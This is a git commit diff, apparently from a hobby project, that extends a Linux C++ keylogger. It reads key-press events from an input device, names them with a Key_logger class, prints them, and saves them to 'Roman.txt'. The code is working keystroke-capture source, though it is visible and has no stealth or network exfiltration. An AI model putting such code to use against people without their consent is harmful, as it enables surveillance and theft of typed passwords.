f47a1dc0c3f4aa96474e31bd01aa60e256c72547
RomanShafranyuk <romanshafranuk@gmail.com>
2022-03-28 19:24:09 +0400

    Небольщие доработки
    Реализована запись клавиш без shift в файл

--- main.cpp
+++ main.cpp
@@ -10,6 +10,9 @@
 #include <errno.h>
 #include <string.h>
 #include <string>
+#include <vector>
+#include "key_logger.h"
+
 int check(int result){
     if (result >= 0)    
         return result;
@@ -21,14 +24,13 @@ int check(int result){
 
 int main()
 {
-    
+    Key_logger name_of_the_keys;
     int keys_fd; //дескриптор
-    std::string user;
-    std::cout << "Enter your name: ";
-    getline(std::cin, user);
-    std::cout << "Your name - " + user << std::endl;
     struct input_event t;  
     keys_fd = check(open(DEV_PATH, O_RDONLY));
+    
+    std::vector<const char*> names;
+    int flag = 0;
     if (keys_fd <= 0)
     {
         printf("open/dev/input/js0 device error!\n");
@@ -39,13 +41,32 @@ int main()
         if (read(keys_fd, &t, sizeof(t)) == sizeof(t))
         {
             if (t.type == EV_KEY)
-                if (t.value == 0 || t.value == 1)
+                if (/*t.value == 0 || */ t.value == 1)
                 {
-                    printf("key %d %s\n", t.code, (t.value) ? "Pressed" : "Released");
+                    if (flag == 42)
+                         t.code += 1000;
+                    names.push_back(name_of_the_keys.get_name_of_the_key(t.code));   
+                    
+                    
+                    printf("key %s %s\n", name_of_the_keys.get_name_of_the_key(t.code), (t.value) ? "Pressed" : "Released");
+                    
+                    flag = t.code;
                 }
+                if (t.code == 1)
+                    break;
         }
+
+        
+    }
+    close(keys_fd);
+    
+    auto d_save = check(open("Roman.txt", O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO));
+    
+    for (int i = 0; i < names.size(); ++i)
+    {
+        write(d_save, names[i], strlen(names[i]) );
     }
 
-    close(keys_fd);
+    close(d_save);
     return 0;
 }
